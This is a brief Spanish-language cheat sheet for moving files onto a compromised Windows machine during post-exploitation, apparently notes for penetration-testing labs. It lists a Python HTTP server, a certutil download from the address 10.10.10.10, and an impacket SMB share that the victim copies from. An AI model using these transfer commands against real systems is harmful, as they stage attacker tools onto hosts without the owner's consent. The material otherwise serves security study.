
--- 
- Tags: #Windows #Post-exploitation #Network #File-transfer
- --- 

**Antes de cualquier transferencia (si hablamos a nivel web)** necesitamos activar un servidor con **python3**

**comando:**

```python
python3 -m http.server 80
```

# Certutil

**Comando**:

```cmd
certutil -urlcache -f http://10.10.10.10/rav.txt rav.txt
```

# SMB

**Comandos:**

Levantamos server con impacket

```bash
impacket-smbserver shared $(pwd) -smb2support
```

Desde victima

```cmd
copy \\10.10.10.10\shared\rav.txt .\rav.txt
```

